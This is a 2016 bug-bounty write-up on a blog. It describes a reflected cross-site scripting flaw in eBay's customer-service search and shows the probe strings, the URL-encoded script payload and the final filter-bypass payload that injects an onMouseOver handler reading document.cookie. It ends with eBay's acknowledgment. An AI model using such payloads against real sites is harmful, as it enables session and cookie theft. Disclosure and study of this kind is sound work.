---
title: "ByPassing EBay XSS Protection"
date: 2016-09-11T00:00:00+05:45
# post image
image: "images/blog/bypassing-ebay-xss-protection/1st.png"
# author
author: "Nirmal Dahal"
# post type (regular/featured)
type: "regular"
tags:
  - XSS
  - XSS Bypass
categories: 
  - vulnerability
# meta description
description: "I was surfing on Facebook and received a message from my brother, Samir, asking for advice regarding some musical instruments. The message contained an eBay link. Once on eBay, I logged into the site to view details and suddenly noticed the \"Help & Contact\" menu, I followed that menu and went to the \"Customer Service\" page where I saw a search field, I decided to check for \"Cross-Site Scripting [ XSS ]\" vulnerability and unexpectedly found POST type R-XSS."
# post draft
draft: false
---

Hi there, today I want to share small proof of concept regarding "Reflective Cross-Site Scripting [ R-XSS ]" which I had found on eBay back in 2016. I am not an active participant in bug bounty programs, but one day I had finished all my office works so I was surfing on Facebook and received a message from my brother, Samir, asking for advice regarding some musical instruments. The message contained an eBay link. Once on eBay, I logged into the site to view details and suddenly noticed the "Help & Contact" menu, I followed that menu and went to the "Customer Service" page where I saw a search field, I decided to check for "Cross-Site Scripting [ XSS ]" vulnerability and unexpectedly found POST type R-XSS.

#### Testing For XSS

As all security researchers do, I also have certain pathways to find vulnerabilities. I always use '>Test12345<" as it contains a number, letter, and syntax. This allows me to see how a website handles user inputs. Some questions like "is the user input sanitized? how sensitive is user input?" can be answered from this idea.

#### Finding XSS

Once I noticed the "Customer service" page with a search field, I used that specific text in the field. I noticed that the value was being reflected without [ >< " ]. I immediately figured out that eBay must have been replacing those syntaxes in White Space. The output in View-Source was like below:

```html    
<input type="text" id="query" role="combobox" name="query" value="‘ Test12345 " title="Search by help topic, keywords, or phrases" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="" aria-value="‘ Test12345 " autocomplete="off" aria-owns="popup" class="dText3"></input>
```

To test and understand the application further, I used the payload below:
```html
"/><script>alert(1);</script><input type="
```

however, the syntax was still filtered by eBay. So I encoded it in URL ENCODE format:

```html
%22%2f%3E%3Cscript%3Ealert%281%29%3B%3C%2fscript%3E%3Cinput%20type%3D%22
```

After that the page source for that specific part was as follow:

```html
<input type="text" id="query" role="combobox" name="query" value="" script alert 1 script input type="" title="Search by help topic, keywords, or phrases" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="" aria-value="" script alert 1 script input type="" autocomplete="off" aria-owns="popup" class="dText3"></input>
```

By seeing this, I realized that eBay was also filtering URL encoded syntax except for %22 & %3D which decoded value is " and =

After these research were made, I tweaked my payload a little to: **%22 onMouseOver=%22prompt(document.cookie)** which decodes to **" onMouseOver="prompt(document.cookie)**

Finally, after this, the XSS attack was successful and all was good to go.

```html
<input type="text" id="query" role="combobox" name="query" value=" " onMouseOver="prompt(document.cookie)" title="Search by help topic, keywords, or phrases" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="" aria-value=" " onMouseOver="prompt(document.cookie)" autocomplete="off" aria-owns="popup" class="dText3"></input>
```
> Almost all eBay domains were vulnerable at that time including eBay.in, eBay.com.au etc

##### Reply From eBay Security Team
{{< image src="/images/blog/bypassing-ebay-xss-protection/2nd.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >}}
##### Acknowledgment By eBay
{{< image src="/images/blog/bypassing-ebay-xss-protection/3rd.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >}}
##### Video POC
{{< youtube s0Abd7h6vpg >}}

Thank you all for reading this write-up. Please feel free to ask if you have any confusion about this article and if I had made any mistake please leave a comment 🙂 or message me on Twitter.